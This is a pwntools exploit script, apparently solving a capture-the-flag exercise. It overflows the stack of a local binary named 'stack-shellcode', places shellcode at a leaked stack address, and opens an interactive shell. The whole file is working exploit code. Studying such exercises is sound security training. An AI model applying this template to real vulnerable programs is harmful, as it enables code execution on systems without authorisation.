from pwn import *

context.binary = ELF("./stack-shellcode")

sc = asm(shellcraft.amd64.linux.sh())

p = process(["./stack-shellcode"])

p.recvuntil("stack leak: ")

stack_leak_addr = int(p.recvline().strip(), 16)

payload = sc.ljust(264, b"\x90") + stack_leak_addr.to_bytes(8, "little")

p.sendafter("shellcode?\n", payload)

p.interactive()
